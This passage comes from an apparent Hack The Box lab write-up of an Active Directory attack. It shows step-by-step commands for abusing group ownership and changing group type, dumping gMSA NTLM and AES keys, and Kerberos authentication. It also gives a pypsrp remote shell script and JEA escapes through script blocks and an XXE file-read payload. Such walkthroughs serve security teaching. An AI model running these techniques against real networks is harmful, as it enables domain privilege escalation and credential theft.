LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              [-] Group 'gMSA Managers' has no members
```

It’s easier to see the next connections in BloodHound, which I’ll collect here:

```css
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains rusthound-ce -d pong.htb -f dc2.pong.htb -u C.Roberts -p AssumedBreach123 -k --zip 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
---------------------------------------------------
Initializing RustHound-CE at 21:53:03 on 11/14/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-14T21:53:03Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-14T21:53:03Z INFO  rusthound_ce] Collection method: All
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pong.htb:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK
[2026-11-14T21:53:03Z INFO  rusthound_ce::transport::ldap] Connected to PONG.HTB Active Directory!
[2026-11-14T21:53:03Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-14T21:53:05Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=pong,DC=htb
[2026-11-14T21:53:05Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=pong,DC=htb
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=pong,DC=htb
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=pong,DC=htb
[2026-11-14T21:53:07Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-14T21:53:08Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=pong,DC=htb
[2026-11-14T21:53:08Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-11-14T21:53:08Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-14T21:53:08Z INFO  rusthound_ce::modules::session] [sessions] 0 active target(s) after expiry/enabled filter
[2026-11-14T21:53:08Z INFO  rusthound_ce::modules::session] [sessions] 0 session(s) enumerated in total across 0 host(s)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK
[2026-11-14T21:53:08Z WARN  rusthound_ce::transport::kerberos] [krb] TGS-REP error for cifs/dc2.pong.htb: KDC error 68
[2026-11-14T21:53:08Z WARN  rusthound_ce::modules] [gpo] SYSVOL collection failed: TGS-REP: KDC error 68
[2026-11-14T21:53:08Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 active target(s) after expiry/enabled filter
[2026-11-14T21:53:08Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 edge(s) across 0 host(s)
[2026-11-14T21:53:08Z INFO  rusthound_ce::modules::webclient] [webclient] 0 active target(s) after expiry/enabled filter
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 2 domains parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-11-14T21:53:08Z INFO  rusthound_ce::json::maker::common] .//20261114215308_pong-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 21:53:08 on 11/14/26! Happy Graphing!
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I’ll upload this to BloodHound and take a look. The gMSA Managers group does have `ReadGMSAPassword` on Pong_gMSA$:

![BloodHound showing the gMSA Managers group on pong.htb with ReadGMSAPassword on Pong\_gMSA$](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c9419f1f77391125.png)

![BloodHound showing the gMSA Managers group on pong.htb with ReadGMSAPassword on Pong\_gMSA$](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-c9419f1f7739.webp)

That group is owned by the IT group:

![BloodHound showing the IT group on ping.htb owns the gMSA Managers group on pong.htb, with c.roberts among the IT group members](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f6de73c7b200c82f.png)

![BloodHound showing the IT group on ping.htb owns the gMSA Managers group on pong.htb, with c.roberts among the IT group members](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-f6de73c7b200.webp)

And c.roberts is a member!

Another way to see this is with `bloodyAD` and `get writable`:

```css
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains bloodyAD --host DC2.pong.htb -d pong.htb -k get writable
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:389  ...  OK

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
DACL: WRITE

distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD
```

The first, third, and fourth results are similar defaults as [above](#writable-objects). There’s no “self”, as there is no c.roberts user on `pong.htb`.

The second item is `DACL: WRITE` over the gMSA Managers group, which comes from the IT group owning it.

There’s another interesting thing about the Pong_gMSA$ account in the description:

![BloodHound object information for Pong\_gMSA$ with the description JEA Enabled gMSA on DC1 highlighted](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/73d66d2432a3146a.png)

![BloodHound object information for Pong\_gMSA$ with the description JEA Enabled gMSA on DC1 highlighted](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-73d66d2432a3.webp)

I’ll come back to this later.

### Recover Account Keys

#### Add User to gMSA Managers Group

As a member of a group that owns another group, I should be able to add users to it. The owner of an object can always modify its DACL, so the first thing to do is give c.roberts `GenericAll` over the group. I’ll have to use the SID of the user rather than the name, or else it’ll generate this error:

```scala
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k add genericAll "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" c.roberts
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 428, in genericAll
    async for e in ldap.bloodysearch(trustee, attr=["objectSid"]):
        entry = e
        break
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 464, in bloodysearch
    base_dn = await self.dnResolver(base)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 299, in dnResolver
    raise NoResultError(self.domainNC, ldap_filter)
bloodyAD.exceptions.NoResultError: No object found in DC=pong,DC=htb with filter: (sAMAccountName=c.roberts)
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It’s trying to find c.roberts in `pong.htb` and failing. It fails the same way if I target `ping.htb/c.roberts`.

I can refer to the user by their SID (findable in BloodHound data and many other ways), and it works, as the SID is unique across domains:

```
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k add genericAll "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" S-1-5-21-750635624-2058721901-1932338391-2617
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=Pong,DC=htb
```

If I try to add c.roberts to the group now, it will still fail:

```typescript
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k add groupMember "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" S-1-5-21-750635624-2058721901-1932338391-2617
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 466, in groupMember
    await ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 341, in bloodymodify
    raise err
badldap.commons.exceptions.LDAPModifyException: unwillingToPerform for CN=gMSA Managers,CN=Users,DC=Pong,DC=htb (Attr) — Reason:(ERROR_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER) A global group cannot have a cross-domain member.
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

“A global group cannot have a cross-domain member.” BloodHound shows this group type:

![BloodHound object information for the gMSA Managers group with Group Scope Global highlighted](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8981d64e7eb8e7b0.png)

![BloodHound object information for the gMSA Managers group with Group Scope Global highlighted](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-8981d64e7eb8.webp)

If I get the current group I can see the type:

```
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k get object "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" --attr groupType

distinguishedName: CN=gMSA Managers,CN=Users,DC=Pong,DC=htb
groupType: -2147483646
```

In hex, that’s 0x80000002, which [breaks down](https://learn.microsoft.com/en-us/windows/win32/adschema/a-grouptype) into 0x80000000 for a security group (as opposed to a distribution group), and 0x00000002 for a global group.

Microsoft defines the [Group Scopes](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755692\(v=ws.10\)) as:

| Scope | Can contain as members | Permissions can be granted | Can convert to | groupType Value |
| --- | --- | --- | --- | --- |
| Global (my target) | Accounts and global groups from the same domain only | Any domain in the forest | Universal (if not a member of another global group) | 0x00000002 |
| Domain local | Accounts, global, and universal groups from any domain (and domain local groups from the same domain) | Same domain only | Universal (if it has no domain local group as a member) | 0x00000004 |
| Universal | Accounts, global, and universal groups from any domain in the forest | Any domain or forest | Global (if no universal group members) or Domain local (no restrictions) | 0x00000008 |

If I want to add a `ping.htb` account to a `pong.htb` group, it must be a domain local group. A universal group isn’t enough, because it only accepts members from its own forest, and `ping.htb` is a separate forest. To get there, I’ll need to convert the group first to a universal group, and then to a domain local group. `bloodyAD` can do this, but it needs the value as a signed 32-bit decimal. The security flag 0x80000000 is -2147483648, so universal is -2147483648 + 8 = -2147483640, and domain local is -2147483648 + 4 = -2147483644:

```bash
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k set object "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" groupType -v -2147483640
[+] CN=gMSA Managers,CN=Users,DC=Pong,DC=htb's groupType has been updated
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k set object "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" groupType -v -2147483644
[+] CN=gMSA Managers,CN=Users,DC=Pong,DC=htb's groupType has been updated
```

Now I can add c.roberts as a group member:

```
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q bloodyAD --host DC2.pong.htb -d pong.htb -k add groupMember "CN=gMSA Managers,CN=Users,DC=Pong,DC=htb" S-1-5-21-750635624-2058721901-1932338391-2617
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to CN=gMSA Managers,CN=Users,DC=Pong,DC=htb
```

#### Recover gMSA AES Key

I’ll use `netexec` now to read the gMSA AES key. If I don’t get a fresh TGT, it will fail:

```css
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q netexec ldap pong.htb --use-kcache --gmsa
LDAP        pong.htb        389    DC2              [*] None (name:DC2) (domain:PING.HTB) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        pong.htb        389    DC2              [+] PING.HTB\c.roberts from ccache 
LDAP        pong.htb        389    DC2              [*] Getting GMSA Passwords
LDAP        pong.htb        389    DC2              Account: Pong_gMSA$           NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA Managers
```

The tickets in my cache were issued before the group change, so they don’t reflect the new membership. gMSA Managers is now a domain local group in `pong.htb`, so it’s DC2 that adds it to the service ticket it issues, and the cached LDAP service ticket for DC2 doesn’t have it. I’ll get a fresh TGT, which also replaces the cache and any stale service tickets in it:

```
oxdf@hacky$ getTGT.py ping.htb/c.roberts:AssumedBreach123
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache
```

And now it works:

```css
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q netexec ldap pong.htb --use-kcache --gmsa
LDAP        pong.htb        389    DC2              [*] None (name:DC2) (domain:PING.HTB) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        pong.htb        389    DC2              [+] PING.HTB\c.roberts from ccache 
LDAP        pong.htb        389    DC2              [*] Getting GMSA Passwords
LDAP        pong.htb        389    DC2              Account: Pong_gMSA$           NTLM: 989bd748ac8dd0b71ab24edccc9fc012     PrincipalsAllowedToReadPassword: gMSA Managers
LDAP        pong.htb        389    DC2              Account: Pong_gMSA$           aes128-cts-hmac-sha1-96: 97cefa17dcaec66d9b52a97be398acf0
LDAP        pong.htb        389    DC2              Account: Pong_gMSA$           aes256-cts-hmac-sha1-96: 725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
```

### Shell

#### Auth

NTLM auth is disabled, so I’ll get a Kerberos TGT as Pong_gMSA$ using the AES key:

```css
oxdf@hacky$ proxychains getTGT.py -aesKey 725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6 'pong.htb/Pong_gMSA$'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[*] Saving ticket in Pong_gMSA$.ccache
```

And it works:

```sql
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache proxychains -q netexec smb dc2.pong.htb --use-kcache
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\Pong_gMSA$ from ccache
```

#### Evil-WinRM-Py

Pong_gMSA$ can’t WinRM directly. First, if I try to connect without the proxy, it hangs for a while and then fails:

```typescript
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache evil-winrm-py -i dc1.ping.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc1.ping.htb:5985' as 'Pong_gMSA$@PONG.HTB'
[-] Processing security token
[-] SpnegoError (4294967295): Major (851968): Unspecified GSS failure.  Minor code may provide more information, Minor (2529639068): Cannot contact any KDC for realm 'PONG.HTB', Context: Processing security token
```

Even though the WinRM target is DC1, `evil-winrm-py` is trying to get a service ticket from DC2 and failing to reach it. I’ll run with `proxychains`:

```css
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache proxychains evil-winrm-py -i dc1.ping.htb -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc1.ping.htb:5985' as 'Pong_gMSA$@PONG.HTB'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc2.pong.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:5985  ...  OK
[-] Received a WSManFault message. (Code: 5, Machine: dc1.ping.htb, Reason: Access is denied.)
```

It fails now, but I can see in the `proxychains` output that it’s connecting to DC2 on 88 (Kerberos). The local ccache now has an ST for `http/dc1.ping.htb`:

```swift
oxdf@hacky$ klist -c Pong_gMSA\$.ccache 
Ticket cache: FILE:Pong_gMSA$.ccache
Default principal: Pong_gMSA$@PONG.HTB

Valid starting       Expires              Service principal
11/15/2026 23:14:10  11/16/2026 09:14:10  krbtgt/PONG.HTB@PONG.HTB
        renew until 11/16/2026 23:14:06
11/15/2026 23:15:58  11/16/2026 09:14:10  krbtgt/PING.HTB@PONG.HTB
        renew until 11/16/2026 23:14:06
11/15/2026 23:15:58  11/16/2026 09:14:10  http/dc1.ping.htb@PING.HTB
        renew until 11/16/2026 23:14:06
```

If I try again, it doesn’t need the connection to DC2, as that ST is cached:

```css
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache proxychains evil-winrm-py -i dc1.ping.htb -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc1.ping.htb:5985' as 'Pong_gMSA$@PONG.HTB'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:5985  ...  OK
[-] Received a WSManFault message. (Code: 5, Machine: dc1.ping.htb, Reason: Access is denied.)
```

But it still fails. That’s because Pong_gMSA$ isn’t allowed on the default WinRM endpoint. The BloodHound description said it’s JEA enabled on DC1, so it can only connect to the `restricted` endpoint from the JEA config I found earlier.

[Evil-WinRM-Py](https://github.com/adityatelange/evil-winrm-py) supports a `--configuration-name` or `-c` flag that will work with JEA profiles. This was added a couple months after PingPong’s release, but I can use it today:

```typescript
oxdf@hacky$ KRB5CCNAME='Pong_gMSA$.ccache' proxychains -q evil-winrm-py -i dc1.ping.htb -k -c restricted
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc1.ping.htb:5985' as 'Pong_gMSA$@PONG.HTB' using config 'restricted'
[%] JEA mode: Commands run as cmdlet pipelines. Run 'Get-Command' to see allowed cmdlets.
evil-winrm-py PS (JEA)>
```

When I started this box, the JEA code for Evil-WinRM-Py doesn’t actually allow for either of the escapes I’ll show, because it is deliberately built for `NoLanguage` endpoints. From `build_cmdlet_pipeline` ’s own docstring:

> structured PSRP invocations rather than script text. This is what makes it work against NoLanguage-mode JEA endpoints, which reject the script text that Invoke-Expression and add_script() rely on… Scriptblocks, variables, operators and other language constructs are unavailable in NoLanguage mode, so there is no way to express them here.

I worked with the author to have it updated, so now it detects if it can run `add_script`, and if so, uses that, falling back to the `NoLanguage` features when it has to. It’s merged on main as of today, but not available in a release yet. It can be installed with `uv tool install --force "evil-winrm-py[kerberos] @ git+https://github.com/adityatelange/evil-winrm-py"`, and it specifically calls out that it’s in ConstrainedLanguage mode now:

```typescript
oxdf@hacky$ KRB5CCNAME='Pong_gMSA$.ccache' proxychains -q evil-winrm-py -i dc1.ping.htb -k -c restricted
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc1.ping.htb:5985' as 'Pong_gMSA$@PONG.HTB' using config 'restricted'
[%] JEA mode (ConstrainedLanguage): Input submitted as PowerShell script. Run 'Get-Command' to see allowed cmdlets.
evil-winrm-py PS (JEA)>
```

#### pypsrp

I can also do this with a `pypsrp` ([Python PowerShell Remoting Protocol Client library](https://github.com/jborean93/pypsrp)) script:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "pypsrp[kerberos]",
# ]
# ///

import sys
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

if len(sys.argv) < 3:
    print(f"usage: {sys.argv[0]} <server> <profile>")
    sys.exit()

SERVER = sys.argv[1]
config = sys.argv[2]


def run(pool, cmd):
    ps = PowerShell(pool)
    ps.add_script(cmd)
    try:
        out = ps.invoke()
    except Exception as e:
        print(f"[-] {type(e).__name__}: {e}")
        return []
    for line in out:
        print(line)
    if ps.had_errors:
        for e in ps.streams.error:
            print(f"[err] {e}")
    return out


print(f"[*] Connecting to {SERVER} endpoint='{config}' via Kerberos")
wsman = WSMan(SERVER, ssl=False, auth="kerberos", encryption="auto")

try:
    with RunspacePool(wsman, configuration_name=config) as pool:
        print("[+] Connected. Type 'exit' or Ctrl-D to quit.\n")
        while True:
            try:
                cmd = input(f"[{config}]> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd in ("exit", "quit"):
                break
            if not cmd:
                continue
            run(pool, cmd)
except Exception as e:
    print(f"[-] Connection failed: {type(e).__name__}: {e}", file=sys.stderr)
    sys.exit(1)
```

The script makes a WinRM connection using Kerberos auth (from the ticket in `KRB5CCNAME`), and opens a runspace pool on the named JEA endpoint, which is the equivalent of `evil-winrm-py` ’s `-c` flag. Then it loops, reading a command, running it as a PowerShell script in that runspace, and printing the output and any errors.

This works to get a shell as well:

```
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache uv run jea.py dc1.ping.htb restricted
[*] Connecting to dc1.ping.htb endpoint='restricted' via Kerberos
[+] Connected. Type 'exit' or Ctrl-D to quit.

[restricted]>
```

#### PowerShell

I can also use PowerShell on Linux to get a remote session. I’ll start PowerShell with the TGT:

```
oxdf@hacky$ KRB5CCNAME=Pong_gMSA\$.ccache pwsh 
PowerShell 7.6.5
PS ~/hackthebox/pingpong>
```

Now I’ll use the `PSWSMan` module to get a remote WinRM session:

```
PS ~/hackthebox/pingpong> Import-Module PSWSMan -RequiredVersion 3.0.0
PS ~/hackthebox/pingpong> Enter-WinRMSession -ComputerName dc1.ping.htb -ConfigurationName restricted -Authentication Kerberos
[dc1.ping.htb]: PS>
```

### JEA Escape

#### Enumeration

Regardless of which shell I use, I am (as expected) in constrained language mode:

```
[dc1.ping.htb]: PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

I can see what commands are available:

```sql
[dc1.ping.htb]: PS> Get-Command
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object   
```

This is the bare default set of commands for a `RestrictedRemoteServer` session. The other things available in constrained language mode are documented on [Microsoft’s language mode page](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.6).

#### Script Blocks

One way out of the constrained shell is to use script blocks:

```python
[dc1.ping.htb]: PS> whoami     
The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of 
the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
[dc1.ping.htb]: PS> &{ whoami }
pong\pong_gmsa$
```

I can run basically any command inside blocks like this. JEA works by marking every command except the allowed ones as private. Private commands can’t be called directly from the remote session, but PowerShell treats a call from inside a script block as internal, and those are allowed. A `NoLanguage` session would block this, because it doesn’t allow script blocks at all.

#### XXE

A different way to escape JEA is a file read via the `[xml]` type accelerator (short for `System.Xml.XmlDocument`), one of the items called out as available in CLM on the documentation page. I can abuse that through an XML external entity (XXE) attack to read files:

```html
[dc1.ping.htb]: PS> $x = [System.Xml.XmlDocument]::new()       
[dc1.ping.htb]: PS> $x.LoadXml(@'                       
>> <?xml version="1.0"?>
>> <!DOCTYPE root [<!ENTITY exfil SYSTEM "file:///C:/programdata/JEA/JEA.pssc">]>
>> <root>&exfil;</root>
>> '@)
[dc1.ping.htb]: PS> $x.DocumentElement.InnerText        
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

# Author of this document
Author = 'Administrator'

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
```

## Shell as c.carlssen on DC2

### Enumeration

The shell lands in Pong_gMSA$’s home directory:

```
[dc1.ping.htb]: PS> &{ pwd}    

Path                         
----                         
C:\Users\Pong_gMSA$\Documents
```

There are a couple files in this directory:

```haskell
[dc1.ping.htb]: PS>&{ tree .. /f}
Folder PATH listing
Volume serial number is 00000203 E721:DA81
C:\USERS\PONG_GMSA$
+---Desktop
+---Documents
